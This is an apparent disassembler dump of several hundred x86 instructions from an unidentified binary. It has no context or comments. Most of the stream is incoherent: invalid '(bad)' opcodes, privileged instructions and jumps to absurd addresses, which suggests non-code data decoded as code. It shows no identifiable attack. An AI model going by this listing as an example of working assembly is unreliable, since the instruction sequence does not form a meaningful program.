  429715:	jnp    0x429716
  429717:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  42971d:	jae    0x4296aa
  42971f:	sub    edi,esp
  429721:	(bad)  
  429722:	shl    DWORD PTR [eax-0x3e],0x89
  429726:	leave  
  429727:	call   0x81984e34
  42972c:	in     al,dx
  42972d:	(bad)  
  42972e:	in     al,dx
  42972f:	add    bh,al
  429731:	mov    esp,edi
  429733:	in     al,dx
  429734:	test   DWORD PTR [ebp-0x8],edi
  429737:	mov    eax,DWORD PTR [ebp+0x2b]
  42973a:	cmp    DWORD PTR [ebx],eax
  42973c:	pushf  
  42973d:	jnp    0x57319376
  429743:	xor    edx,DWORD PTR [eax-0x77]
  429746:	push   ecx
  429747:	loopne 0x42977c
  429749:	jne    0x429706
  42974b:	mov    esi,DWORD PTR [edx-0x20]
  42974e:	add    BYTE PTR [ebp-0x3d],bh
  429751:	xor    eax,DWORD PTR [ebp-0x73]
  429754:	mov    edi,DWORD PTR [esi]
  429756:	cld    
  429757:	jb     0x42971f
  429759:	add    bl,al
  42975b:	jne    0x4297a2
  42975d:	mov    edx,DWORD PTR [edi-0x10]
  429760:	jge    0x4297df
  429762:	mov    esi,DWORD PTR [ebx]
  429764:	lock add ecx,DWORD PTR [ebp+0x3b]
  429768:	xor    esi,DWORD PTR [ebp-0x77]
  42976b:	mov    esi,eax
  42976d:	lock inc ebp
  42976f:	jge    0x4297a9
  429771:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  429778:	dec    ebp
  429779:	mov    esi,DWORD PTR [ebx]
  42977b:	loopne 0x429706
  42977d:	jge    0x429777
  42977f:	add    DWORD PTR [ebp-0x7d],eax
  429782:	clc    
  429783:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42978a:	dec    ebp
  42978b:	hlt    
  42978c:	xor    ebx,DWORD PTR [ebp-0x77]
  42978f:	mov    esi,esp
  429791:	in     al,0x45
  429793:	jge    0x4297d1
  429795:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42979c:	dec    ebp
  42979d:	cmp    al,0x33
  42979f:	xchg   ebx,eax
  4297a0:	mov    DWORD PTR [ebx-0x14],esi
  4297a3:	add    eax,DWORD PTR [ebp-0xc]
  4297a6:	cmp    BYTE PTR [ebp-0x61],dh
  4297a9:	mov    edi,DWORD PTR [eax+0xf19504]
  4297af:	repnz mov DWORD PTR [ebp+0x20],ebx
  4297b3:	cmp    eax,DWORD PTR [ebp+0xf]
  4297b6:	test   DWORD PTR [edi+ecx*1-0x1],edx
  4297ba:	fistp  WORD PTR [ebx+0x0]
  4297bd:	inc    ebp
  4297be:	mov    ebx,DWORD PTR [edi+0xc]
  4297c1:	add    eax,eax
  4297c3:	inc    ebp
  4297c4:	test   BYTE PTR [ebx],dh
  4297c6:	add    eax,DWORD PTR [ebx]
  4297c8:	add    BYTE PTR [esi+0x45],bl
  4297cb:	ret    0x85
  4297ce:	jnp    0x54431b9d
  4297d4:	inc    bp
  4297d6:	inc    ebp
  4297d7:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  4297dd:	fdiv   QWORD PTR [ebx]
  4297df:	test   DWORD PTR [ecx+0x453af8],edi
  4297e5:	push   ebx
  4297e6:	add    edi,DWORD PTR [esi+0x708088b]
  4297ec:	cmp    esi,eax
  4297ee:	sets   BYTE PTR [ecx-0x74fcffce]
  4297f5:	mov    esp,edi
  4297f7:	call   0x33cddd49
  4297fc:	or     BYTE PTR [ebx],al
  4297fe:	inc    ecx
  4297ff:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429805:	and    BYTE PTR [ebp-0x7074f0bb],al
  42980b:	lock add cl,al
  42980e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429815:	mov    ch,0x45
  429817:	clc    
  429818:	xor    eax,DWORD PTR [ebp+0x3]
  42981b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  429821:	inc    ebp
  429822:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  429828:	mov    edi,eax
  42982a:	mov    eax,DWORD PTR [ebp+0x3c]
  42982d:	mov    ecx,DWORD PTR [eax]
  42982f:	hlt    
  429830:	inc    ebp
  429831:	ror    DWORD PTR [ebx+0x818c45],0xf4
  429838:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  42983e:	push   ebp
  42983f:	mov    edi,DWORD PTR [ebx]
  429841:	in     al,dx
  429842:	jne    0x429805
  429844:	mov    eax,DWORD PTR [ebp-0x28]
  429847:	add    DWORD PTR [eax],0xe8058dec
  42984d:	clc    
  42984e:	mov    esp,DWORD PTR [edi-0x8]
  429851:	add    dh,dl
  429853:	rol    WORD PTR [ebp-0x1],cl
  429857:	mov    edx,DWORD PTR [eax+0x8]
  42985a:	jne    0x42981c
  42985c:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  429863:	inc    ebp
  429864:	push   esp
  429865:	test   DWORD PTR [ecx+0xf],ecx
  429868:	sub    edx,esp
  42986a:	add    eax,DWORD PTR [eax]
  42986c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  429872:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  429879:	mov    eax,DWORD PTR [ecx]
  42987b:	and    BYTE PTR [eax],al
  42987d:	adc    BYTE PTR ss:[eax],al
  429880:	inc    ebp
  429881:	inc    cx
  429884:	push   esp
  429885:	cld    
  429886:	jne    0x429888
  429888:	push   edx
  429889:	enterw 0xc1,0x4d
  42988e:	mov    esp,DWORD PTR [esi+0x20]
  429891:	add    DWORD PTR [ecx-0x7b],eax
  429894:	add    eax,DWORD PTR [ebx]
  429896:	str    WORD PTR [eax+0x45]
  42989a:	lea    ecx,[ebx+0x45890801]
  4298a0:	sbb    BYTE PTR [ebx],al
  4298a2:	dec    ebp
  4298a3:	cmp    al,0xf
  4298a5:	inc    ebp
  4298a6:	push   eax
  4298a7:	mov    esi,DWORD PTR [ebx]
  4298a9:	push   eax
  4298aa:	add    eax,eax
  4298ac:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4298b3:	inc    ebp
  4298b4:	add    BYTE PTR [eax],bh
  4298b6:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4298bd:	(bad)  
  4298be:	mov    ebx,eax
  4298c0:	loopne 0x429907
  4298c2:	dec    ebp
  4298c3:	mov    ecx,DWORD PTR [edi]
  4298c5:	cld    
  4298c6:	push   eax
  4298c7:	xchg   DWORD PTR [ebx],esi
  4298c9:	add    DWORD PTR [ebx],ebp
  4298cb:	add    BYTE PTR [ebx],ch
  4298cd:	or     BYTE PTR [ecx],bh
  4298cf:	dec    ecx
  4298d0:	loopne 0x4298d5
  4298d2:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4298d8:	push   ebp
  4298d9:	add    DWORD PTR [ebx+0x55100800],eax
  4298df:	dec    ebp
  4298e0:	jmp    0x42986b
  4298e2:	mov    esp,DWORD PTR [eax]
  4298e4:	sbb    dl,dl
  4298e6:	inc    eax
  4298e7:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  4298ed:	add    BYTE PTR [ebx+0x74528555],cl
  4298f3:	push   ebp
  4298f4:	div    DWORD PTR [ebx]
  4298f6:	and    eax,DWORD PTR [ebx]
  4298f8:	add    edx,DWORD PTR [edx-0x30]
  4298fb:	jno    0x429888
  4298fd:	inc    DWORD PTR [eax+eiz*1]
  429900:	inc    ebp
  429901:	push   eax
  429902:	push   eax
  429903:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429909:	mov    edi,esp
  42990b:	push   eax
  42990c:	inc    ebp
  42990d:	enter  0x458b,0x8
  429911:	push   ecx
  429912:	(bad)  
  429913:	call   0x10ca2eb
  429918:	pop    ss
  429919:	push   ebp
  42991a:	mov    ecx,DWORD PTR [ebx+0x489408]
  429920:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  429926:	push   ecx
  429927:	jo     0x429911
  429929:	inc    DWORD PTR [edi]
  42992b:	or     BYTE PTR [eax],al
  42992d:	call   0xcda077
  429932:	fmul   QWORD PTR [ebp+0x55]
  429935:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  42993b:	mov    bh,0x8c
  42993d:	adc    al,0x98
  42993f:	dec    esp
  429940:	xor    bl,BYTE PTR [eax]
  429942:	mov    ecx,DWORD PTR [ebp+0xc]
  429945:	mov    eax,DWORD PTR [ebp-0x4]
  429948:	mov    esi,DWORD PTR [edi-0x3148f924]
  42994e:	push   es
  42994f:	retf   
  429950:	mov    BYTE PTR [ebp-0x30],0x3b
  429954:	inc    ebp
  429955:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  42995c:	retf   0x83fc
  42995f:	into   
  429960:	dec    ebp
  429961:	retf   
  429962:	mov    ecx,DWORD PTR [ebp-0x74]
  429965:	mov    eax,DWORD PTR [eax]
  429967:	fdiv   QWORD PTR [ebx]
  429969:	mov    bh,0x3
  42996b:	push   es
  42996c:	mov    esi,ecx
  42996e:	sbb    cl,dl
  429970:	dec    ebp
  429971:	sar    DWORD PTR [ebx],cl
  429973:	push   ebp
  429974:	jne    0x429985
  429976:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42997c:	lea    ebx,[eax]
  42997e:	call   0xf4cc2545
  429983:	sbb    dh,dl
  429985:	add    edx,ebx
  429987:	push   ebp
  429988:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42998e:	push   ecx
  42998f:	mov    DWORD PTR [eax-0x30],edx
  429992:	test   DWORD PTR [edx],eax
  429994:	xadd   esp,esi
  429997:	pop    es
  429998:	add    cl,dl
  42999a:	mov    eax,ecx
  42999c:	or     al,0x45
  42999e:	(bad)  
  42999f:	push   eax
  4299a0:	add    DWORD PTR [edx+0x0],eax
  4299a3:	add    ecx,DWORD PTR [ecx]
  4299a5:	and    dh,cl
  4299a7:	call   0xc6a277
  4299ac:	add    DWORD PTR [ebp+0x0],edx
  4299af:	mov    esp,DWORD PTR [ebp+0x18]
  4299b2:	add    BYTE PTR [eax+0x44],cl
  4299b5:	xor    eax,DWORD PTR [eax]
  4299b7:	add    esp,DWORD PTR [esi+0x3b]
  4299ba:	inc    ebp
  4299bb:	je     0x429940
  4299bd:	push   ecx
  4299be:	or     cl,BYTE PTR [ebp-0x77]
  4299c1:	add    eax,esi
  4299c3:	or     al,0x5e
  4299c5:	inc    eax
  4299c6:	add    BYTE PTR [ebx],al
  4299c8:	data16 and BYTE PTR [ebp+0x50],al
  4299cc:	sub    DWORD PTR [ecx],0xffffffe8
  4299cf:	add    BYTE PTR [ebp-0x75],ah
  4299d2:	add    BYTE PTR [eax],bl
  4299d4:	enter  0x894d,0x8b
  4299d8:	int3   
  4299d9:	loopne 0x429a0d
  4299db:	rol    BYTE PTR [eax],0x33
  4299de:	lea    cx,[ebp+0xa]
  4299e2:	data16 jb 0x429a2a
  4299e5:	add    BYTE PTR [ebx+0x44890855],cl
  4299eb:	sbb    ah,al
  4299ed:	inc    ebp
  4299ee:	lldt   WORD PTR ss:[edx+0x66]
  4299f3:	xor    ecx,DWORD PTR [eax]
  4299f5:	sub    edi,esp
  4299f7:	mov    eax,DWORD PTR [eax]
  4299f9:	or     al,0x66
  4299fb:	ror    edx,cl
  4299fd:	dec    ebp
  4299fe:	inc    ebp
  4299ff:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429a05:	cld    
  429a06:	or     BYTE PTR [edi+0x4501dd],dl
  429a0c:	(bad)  
  429a0d:	into   
  429a0e:	out    dx,al
  429a0f:	retf   
  429a10:	(bad)  
  429a11:	dec    ebp
  429a12:	mov    al,0x8b
  429a14:	jmp    0xea27:0x450ac320
  429a1b:	xchg   esi,ebp
  429a1d:	add    edi,eax
  429a1f:	add    BYTE PTR [eax+0x3f52e955],bh
  429a25:	push   ebp
  429a26:	inc    ebp
  429a27:	xor    ebx,esp
  429a29:	add    ebp,esi
  429a2b:	push   edx
  429a2c:	push   bp
  429a2e:	inc    ebp
  429a2f:	(bad)  
  429a30:	in     eax,dx
  429a31:	push   esp
  429a32:	(bad)  
  429a33:	inc    edx
  429a35:	sbb    al,0x33
  429a37:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  429a3e:	add    BYTE PTR [ebp+0x43],0x8b
  429a42:	jmp    0xf98b:0x100041c8
  429a49:	xor    esi,DWORD PTR [edx+0x3]
  429a4c:	mov    ecx,DWORD PTR [edi]
  429a4e:	fmul   DWORD PTR [edx]
  429a50:	add    BYTE PTR [eax],al
  429a52:	lea    eax,[ebx-0x4700273c]
  429a58:	add    al,0x4f
  429a5a:	pop    DWORD PTR [eax]
  429a5c:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  429a62:	push   edx
  429a63:	inc    WORD PTR [ebp+0x8]
  429a67:	mov    eax,0x514f4d
  429a6c:	(bad)
  429a70:	add    al,al
  429a72:	xor    DWORD PTR [ebx-0x74baf730],eax
  429a78:	test   DWORD PTR [esi+0x74],esp
  429a7b:	inc    ebp
  429a7c:	mov    DWORD PTR [eax+0xa4f08],edi
  429a82:	add    BYTE PTR [ecx-0x76c435bb],cl
  429a88:	or     dh,cl
  429a8a:	or     eax,0x8b8d5045
  429a8f:	inc    ebp
  429a90:	mov    WORD PTR [ecx+0x3b8a00],?
  429a96:	jne    0x429acb
  429a98:	mov    edi,DWORD PTR [edx+0x8f3a18]
  429a9e:	add    DWORD PTR [ebx],eax
  429aa0:	add    bh,bh
  429aa2:	adc    DWORD PTR [eax],ecx
  429aa4:	adc    DWORD PTR [ebp+0x55],edi
  429aa7:	push   es
  429aa8:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  429aae:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429ab5:	inc    ebp
  429ab6:	mov    esp,edi
  429ab8:	or     al,0xdc
  429aba:	push   eax
  429abb:	(bad)  
  429abc:	jne    0x429a72
  429abe:	call   0x3a93af
  429ac3:	inc    ebp
  429ac4:	rol    dl,0x84
  429ac7:	out    dx,al
  429ac8:	add    bh,al
  429aca:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429ad1:	(bad)  
  429ad2:	and    al,al
  429ad4:	fs in  eax,dx
  429ad6:	inc    DWORD PTR [ebp-0x7b]
  429ad9:	js     0x429aea
  429adb:	leave  
  429adc:	scas   al,BYTE PTR es:[edi]
  429add:	inc    esp
  429ade:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429ae5:	or     BYTE PTR [ebx-0x97717c5],0x83
  429aec:	call   DWORD PTR [edi]
  429aee:	shr    ah,0x84
  429af1:	xchg   DWORD PTR [eax],eax
  429af3:	add    DWORD PTR [eax],eax
  429af5:	add    bh,bh
  429af7:	dec    ebp
  429af8:	and    BYTE PTR [ecx-0x38],dl
  429afb:	push   eax
  429afc:	dec    DWORD PTR [ebx+0xfd885]
  429b02:	mov    BYTE PTR [ebp+0x508bac00],cl
  429b08:	mov    WORD PTR [ecx+0x0],ss
  429b0b:	lea    ecx,[ebx+0x108b20d8]
  429b11:	mov    WORD PTR [edx],ds
  429b13:	add    BYTE PTR [edi+0xff01ff],al
  429b19:	mov    ecx,DWORD PTR [ebp-0x28]
  429b1c:	push   ecx
  429b1d:	shl    BYTE PTR [ebp+0x3a],0x8b
  429b21:	inc    ebp
  429b22:	in     al,0xeb
  429b24:	jno    0x429ab1
  429b26:	push   edx
  429b27:	mov    DWORD PTR [eax-0x28],edx
  429b2a:	mov    eax,DWORD PTR [ebp+0x20]
  429b2d:	je     0x429ab6
  429b2f:	mov    eax,DWORD PTR [ecx]
  429b31:	sbb    BYTE PTR [eax],al
  429b33:	pop    DWORD PTR [eax]
  429b35:	add    esi,eax
  429b37:	add    bl,al
  429b39:	adc    DWORD PTR [edi],esi
  429b3b:	jmp    0x8bcdeb8d
  429b40:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  429b47:	jne    0x429ad4
  429b49:	mov    ecx,DWORD PTR [eax]
  429b4b:	in     al,0x75
  429b4d:	pop    DWORD PTR [ecx+0x5001]
  429b53:	push   edx
  429b54:	inc    DWORD PTR [ebx]
  429b56:	adc    BYTE PTR [ecx+0x45721cc6],cl
  429b5c:	add    BYTE PTR [edi+0x9],dl
  429b5f:	call   DWORD PTR [esi]
  429b61:	and    dl,al
  429b63:	and    bh,bh
  429b65:	inc    edi
  429b67:	test   eax,edx
  429b69:	sldt   ebx
  429b6c:	cmp    DWORD PTR [eax],eax
  429b6e:	pushf  
  429b6f:	(bad)  
  429b70:	jmp    0x429b7e
  429b72:	mov    eax,edi
  429b74:	or     al,0x75
  429b76:	inc    eax
  429b77:	call   0x42927f
  429b7c:	mov    eax,eax
  429b7e:	loopne 0x429b04
  429b80:	inc    ebp
  429b81:	add    BYTE PTR [ebx+0x1451c00],cl
  429b87:	mov    eax,DWORD PTR [ebp+0x20]
  429b8a:	add    edi,ecx
  429b8c:	add    BYTE PTR [eax],ch
  429b8e:	cmp    edi,0x18
  429b91:	test   DWORD PTR [ebp+0xf],esi
  429b94:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  429b9b:	jne    0x429b9f
  429b9d:	call   0xffa19662
  429ba2:	leave  
  429ba3:	rcr    BYTE PTR [esp+eax*4],0x55
  429ba7:	add    ah,ch
  429ba9:	add    BYTE PTR [edi-0x48fef979],dh
  429baf:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429bb6:	inc    esp
  429bb7:	mov    ebx,DWORD PTR [eax]
  429bb9:	fcom   st(2)
  429bbb:	add    BYTE PTR [edi],bl
  429bbd:	lea    ecx,[eax-0x18]
  429bc0:	(bad)  
  429bc1:	push   DWORD PTR [ecx]
  429bc3:	call   0xffb4e925
  429bc8:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  429bcc:	fstp   DWORD PTR [esi+ebx*8]
  429bcf:	push   ebp
  429bd0:	pop    ebp
  429bd1:	mov    esi,DWORD PTR [edx-0x38]
  429bd4:	add    DWORD PTR [eax],0x28
  429bd7:	mov    edi,DWORD PTR [ebx]
  429bd9:	xor    esi,DWORD PTR [edx+0x3]
  429bdc:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429be0:	pop    ebp
  429be1:	or     al,0x4
  429be3:	inc    ecx
  429be4:	push   ebp
  429be5:	(bad)  
  429be6:	in     al,dx
  429be7:	or     ah,ch
  429be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bea:	xbegin 0xffc811e0
  429bf0:	clc    
  429bf1:	adc    al,0x45
  429bf3:	idiv   BYTE PTR [ecx]
  429bf5:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  429bfc:	test   DWORD PTR [eax+0x665300f8],ebx
  429c02:	add    BYTE PTR [ecx+0x66],dh
  429c05:	add    eax,DWORD PTR [ebp+0x52]
  429c08:	adc    eax,0x20
  429c0b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429c11:	test   DWORD PTR [eax],eax
  429c13:	clc    
  429c14:	data16 or al,BYTE PTR [ebp+0x45]
  429c18:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  429c1f:	rol    BYTE PTR [ebp+0x45],1
  429c22:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  429c28:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  429c2e:	push   ebx
  429c2f:	add    BYTE PTR [eax+0x0],dl
  429c32:	push   ecx
  429c33:	jge    0x429c68
  429c35:	add    BYTE PTR [esi+0x4],dl
  429c38:	jne    0x429c9f
  429c3a:	mov    edx,0x457200
  429c3f:	jmp    0x429c03
  429c41:	xor    edi,DWORD PTR [ebx]
  429c43:	pop    edi
  429c44:	cvtdq2ps xmm7,xmm0
  429c47:	ret    0x0
  429c4a:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  429c50:	xor    ecx,DWORD PTR [edi]
  429c52:	add    eax,DWORD PTR [ecx+0x3b]
  429c55:	push   ebx
  429c56:	rdpmc  
  429c58:	out    0x8d,al
  429c5a:	add    BYTE PTR [eax],cl
  429c5c:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429c62:	ret    0x450c
  429c65:	sbb    al,0x8b
  429c67:	cmp    eax,esi
  429c69:	or     cl,al
  429c6b:	or     al,0xc2
  429c6d:	pop    eax
  429c6e:	inc    ebp
  429c6f:	add    ecx,DWORD PTR [edi]
  429c71:	add    esi,DWORD PTR [ebp+0x39]
  429c74:	invd   
  429c76:	jge    0x429c82
  429c78:	mov    eax,0x478ac0
  429c7d:	cli    
  429c7e:	xor    esp,ecx
  429c80:	mov    ebx,0x5b8ac0
  429c85:	ret    0x33
  429c88:	mov    eax,0x833a8b
  429c8d:	sub    BYTE PTR [ebx],al
  429c8f:	inc    ebp
  429c90:	data16 cmp al,bh
  429c93:	pushf  
  429c94:	inc    bh
  429c96:	mov    esp,esp
  429c98:	hlt    
  429c99:	test   DWORD PTR [ebp-0x8],esi
  429c9c:	mov    eax,DWORD PTR [ebp-0x14]
  429c9f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429ca5:	dec    edi
  429ca6:	or     BYTE PTR [eax],al
  429ca8:	jne    0x429c33
  429caa:	mov    esi,esp
  429cac:	call   0x77a92871
  429cb1:	inc    ebp
  429cb2:	mov    DWORD PTR [eax+0x984f0c],edi
  429cb8:	add    BYTE PTR [ecx-0x3ffe0717],cl
  429cbe:	add    BYTE PTR [esi+0x7d],ah
  429cc1:	inc    ebp
  429cc2:	mov    bx,WORD PTR [ebp+0x8]
  429cc6:	add    DWORD PTR [ebp+0x50],0x30c008b
  429ccd:	inc    ebp
  429cce:	mov    bx,di
  429cd1:	lock test BYTE PTR [ecx+0x7000801],bh
  429cd8:	jge    0x429c9b
  429cda:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429ce0:	cli    
  429ce1:	xor    bl,bh
  429ce3:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429ce9:	test   BYTE PTR [eax],cl
  429ceb:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429cf2:	cmp    ebp,eax
  429cf4:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  429cfb:	test   BYTE PTR [ebp+0x1],bh
  429cfe:	mov    ebx,0x458a00
  429d03:	xor    esi,DWORD PTR [ebx]
  429d05:	add    esp,DWORD PTR [esi-0x77]
  429d08:	pop    ebp
  429d09:	loopne 0x429d71
  429d0b:	inc    ebp
  429d0c:	clc    
  429d0d:	xor    edi,DWORD PTR [ebx]
  429d0f:	add    esi,DWORD PTR [edx-0x77]
  429d12:	data16 fdivr QWORD PTR [ebp-0x49]
  429d16:	mov    ebx,0xb78afc
  429d1b:	hlt    
  429d1c:	xor    esi,DWORD PTR [esi]
  429d1e:	data16 add BYTE PTR [ebp+0x66],bl
  429d22:	data16 lock clc 
  429d25:	cmp    eax,DWORD PTR ss:[eax]
  429d28:	ja     0x429d90
  429d2a:	psubq  mm7,QWORD PTR [ebp-0x4]
  429d2e:	ltr    WORD PTR [ebp+0x66]
  429d32:	add    esi,eax
  429d34:	add    di,WORD PTR [ebp+0x2b]
  429d38:	data16 data16 jge 0x429db9
  429d3c:	mov    ebx,0xe08a8b
  429d41:	jge    0x429d76
  429d43:	data16 data16 xor al,0x5d
  429d47:	data16 data16 jne 0x429d43
  429d4b:	mov    edi,DWORD PTR [ebx]
  429d4d:	fdiv   QWORD PTR [edx+0x7d]
  429d50:	data16 data16 jge 0x429d88
  429d54:	mov    ebx,0x758a66
  429d59:	mov    esi,0x667233
  429d5e:	pop    ebp
  429d5f:	or     BYTE PTR [esi+0x0],ah
  429d62:	clc    
  429d63:	mov    edi,DWORD PTR [ebx]
  429d65:	lock ja 0x429cf3
  429d68:	(bad)  
  429d6a:	jge    0x429d63
  429d6c:	invd   
  429d6e:	pop    ebp
  429d6f:	add    BYTE PTR [ebx],al
  429d71:	(bad)  
  429d72:	cmp    di,WORD PTR [ebp+0xf]
  429d76:	data16 sbb bh,BYTE PTR [ebp+0x0]
  429d7a:	mov    bx,WORD PTR [ebp-0x10]
  429d7e:	pop    bp
  429d80:	fbstp  TBYTE PTR [ebx]
  429d82:	test   DWORD PTR [ebx],eax
  429d84:	add    BYTE PTR [ebx],bh
  429d86:	add    BYTE PTR [esi+0x7d],ah
  429d89:	jge    0x429d16
  429d8b:	data16 in al,dx
  429d8d:	pop    ebp
  429d8e:	stc    
  429d8f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429d96:	mov    edi,ebx
  429d98:	in     al,dx
  429d99:	test   BYTE PTR [ebp+0x0],bh
  429d9c:	mov    eax,DWORD PTR [eax]
  429d9e:	call   0xbd3f972e
  429da3:	ss cwde 
  429da5:	add    BYTE PTR [edx],dh
  429da7:	mov    bx,di
  429daa:	call   0x8b4b1b3a
  429daf:	add    ebp,esp
  429db1:	mov    bx,di
  429db4:	jnp    0x429ddc
  429db6:	mov    DWORD PTR [ebx+0x367df808],ecx
  429dbc:	mov    eax,DWORD PTR [eax]
  429dbe:	call   0x7c3e2929
  429dc3:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429dc9:	data16 data16 fistp WORD PTR [ebp+0xe]
  429dce:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429dd8:	fisttp WORD PTR [ecx-0x7401f77b]
  429dde:	(bad)  
  429ddf:	cld    
  429de0:	jne    0x429e18
  429de2:	xor    eax,DWORD PTR [eax]
  429de4:	mov    esp,DWORD PTR [esi-0x10]
  429de7:	sti    
  429de8:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  429def:	data16 adc bl,bh
  429df2:	push   ebp
  429df3:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  429dfa:	mov    WORD PTR [eax],es
  429dfc:	cwde   
  429dfd:	data16 xor bh,bl
  429e00:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429e06:	mov    esp,DWORD PTR [esi-0x14]
  429e09:	fisttp WORD PTR [ebx-0x3748a9f2]
  429e0f:	or     al,0x2b
  429e11:	mov    bh,0xba
  429e13:	hlt    
  429e14:	mov    bh,bl
  429e16:	add    BYTE PTR [ecx-0x7446f3cd],cl
  429e1c:	dec    edi
  429e1d:	or     al,0x0
  429e1f:	mov    edi,DWORD PTR [ebx]
  429e21:	or     BYTE PTR [ebp+0x3b],dh
  429e24:	mov    ecx,DWORD PTR [edi]
  429e26:	fdivr  QWORD PTR [ebx-0x7499ff83]
  429e2c:	xor    al,0xd8
  429e2e:	pop    bp
  429e30:	lock xor esi,DWORD PTR [ebx]
  429e33:	lea    esp,[esi+0x1f]
  429e36:	icebp  
  429e37:	jb     0x429e3d
  429e39:	add    al,al
  429e3b:	jge    0x429e49
  429e3d:	mov    eax,eax
  429e3f:	fsubr  st,st(3)
  429e41:	pop    ebp
  429e42:	mov    esi,DWORD PTR [ebx]
  429e44:	in     al,0x8d
  429e46:	rcr    DWORD PTR [edi],0xc2
  429e49:	jb     0x429ea9
  429e4b:	add    cl,cl
  429e4d:	jge    0x429e5b
  429e4f:	mov    edx,DWORD PTR [ebp-0x20]
  429e52:	in     al,dx
  429e53:	pop    ebp
  429e54:	data16 data16 or BYTE PTR [esi+edi*4],bh
  429e59:	data16 cmp bh,BYTE PTR [ebp+0x0]
  429e5d:	mov    ebp,DWORD PTR [ebx]
  429e5f:	fdivr  QWORD PTR [esi+0x668a5d]
  429e65:	cmp    al,0x33
  429e67:	mov    si,0x4f7d
  429e6b:	mov    eax,DWORD PTR [eax]
  429e6d:	lock inc ebp
  429e6f:	mov    esi,DWORD PTR [edi]
  429e71:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429e78:	clc    
  429e79:	(bad)  
  429e7a:	cmp    edi,DWORD PTR [ebx]
  429e7c:	je     0x429e8d
  429e7e:	push   ebx
  429e7f:	loopne 0x429e90
  429e81:	dec    ecx
  429e83:	mov    ebp,DWORD PTR [eax-0x1c]
  429e86:	int    0xf1
  429e88:	mov    esi,0x703084d
  429e8d:	orps   xmm6,xmm1
  429e90:	add    BYTE PTR [ebp+0x66],dh
  429e93:	jmp    0x429e60
  429e95:	mov    eax,DWORD PTR [ebx]
  429e97:	lock push ebp
  429e99:	ror    DWORD PTR [ebp-0x2972feb3],1
  429e9f:	or     bh,dl
  429ea1:	jb     0x429ea1
  429ea3:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429ea9:	loopne 0x429eab
  429eab:	jne    0x429ea9
  429ead:	data16 add BYTE PTR [esi+eiz*2],dh
  429eb1:	mov    ecx,ebx
  429eb3:	data16 ss icebp 
  429eb6:	add    BYTE PTR [esi],dh
  429eb8:	data16 add bl,cl
  429ebb:	data16 xor dh,dl
  429ebe:	add    BYTE PTR [edx],dh
  429ec0:	data16 add bl,cl
  429ec3:	enterw 0x4df1,0x19
  429ec8:	pop    edi
  429ec9:	jne    0x429e4c
  429ecb:	mov    esi,DWORD PTR [edi]
  429ecd:	call   0x77b72a6e
  429ed2:	xor    ebp,DWORD PTR [ebx]
  429ed4:	lea    esp,[esi+0x48]
  429ed7:	repnz in eax,0x3b
  429eda:	add    BYTE PTR [ebp-0x37],dh
  429edd:	xor    edx,DWORD PTR [ebp-0x15]
  429ee0:	in     al,dx
  429ee1:	xor    edx,DWORD PTR [esi+0x40]
  429ee4:	mov    DWORD PTR [edi],0x338545fc
  429eea:	clc    
  429eeb:	add    edi,DWORD PTR [eax]
  429eed:	pop    edi
  429eee:	pushf  
  429eef:	pop    ebx
  429ef0:	call   0xff439eb7
  429ef5:	mov    edi,eax
  429ef7:	push   ecx
  429ef8:	pop    es
  429ef9:	mov    edi,DWORD PTR [ebx]
  429efb:	push   esi
  429efc:	inc    ebx
  429efd:	cld    
  429efe:	js     0x429f00
  429f00:	popa   
  429f01:	data16 (bad) 
  429f03:	into   
  429f04:	push   0xb900cd36
